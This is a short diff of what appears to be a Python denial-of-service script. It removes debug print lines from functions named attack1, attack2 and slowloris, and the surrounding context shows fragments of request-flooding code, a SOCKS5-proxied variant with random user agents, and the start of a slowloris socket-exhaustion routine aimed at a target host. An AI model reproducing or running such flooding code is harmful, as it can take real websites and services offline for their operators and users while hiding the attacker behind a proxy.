@@ -68,7 +68,6 @@ regular_headers = [
                 ]
 
 def attack1(host, port):
-    print('1')
     foo = ['GET', 'POST']
     http = random.choice(foo)
     try:
@@ -100,7 +99,6 @@ def attack1(host, port):
 
 
 def attack2(host1, port):
-    print('2')
     try:
         opener = urllib2.build_opener(SocksiPyHandler(socks.SOCKS5, "127.0.0.1", port, True))
         opener.addheaders = [('User-Agent', random.choice(useragents))]
@@ -157,7 +155,6 @@ def init_socket(target1):
   return s
 
 def slowloris(target1, count):
-    print('3')
     socket_list=[]
     for _ in range(int(count)):
         try:
